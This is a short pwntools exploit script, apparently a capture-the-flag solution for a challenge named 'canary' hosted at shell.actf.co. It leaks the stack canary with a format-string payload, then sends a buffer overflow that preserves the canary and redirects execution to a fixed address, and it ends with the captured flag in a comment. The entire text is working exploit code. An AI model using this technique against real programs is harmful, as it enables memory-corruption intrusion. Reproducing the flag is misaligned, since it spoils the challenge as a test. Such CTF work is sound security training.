from pwn import *

elf = ELF('./canary')
# p = process('./canary')
# gdb.attach(p,'''
#     init-gef
# ''')
p = remote("shell.actf.co", 20701)

payload = "%17$p"

p.sendlineafter("name? ", payload)

p.recvuntil("you, ")
canary = int(p.recvuntil("!\n")[:-2],16)

payload2 = "A"*(0x40-8) + p64(canary) +p64(0) + p64(0x400787)

# 0x40
p.sendlineafter("tell me? ", payload2)

p.interactive()
# actf{youre_a_canary_killer_>:(}